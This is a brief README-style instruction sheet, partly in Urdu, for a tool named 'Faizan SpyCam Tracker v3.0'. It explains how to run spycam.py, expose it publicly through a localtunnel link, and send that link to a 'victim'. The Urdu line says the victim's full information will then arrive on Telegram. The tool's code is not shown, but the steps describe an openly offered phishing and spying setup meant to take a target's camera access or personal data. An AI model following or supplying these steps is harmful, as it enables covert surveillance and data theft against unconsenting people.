
📦 Faizan™ SpyCam Tracker v3.0

👣 Steps to Run:
1. unzip faizan_spycam.zip
2. cd faizan_spycam
3. python spycam.py
4. Open another terminal and run:
   lt --port 5000
5. You'll get a URL like: https://something.loca.lt
6. Send that to victim.

Telegram پر Victim کی مکمل Info آ جائے گی۔
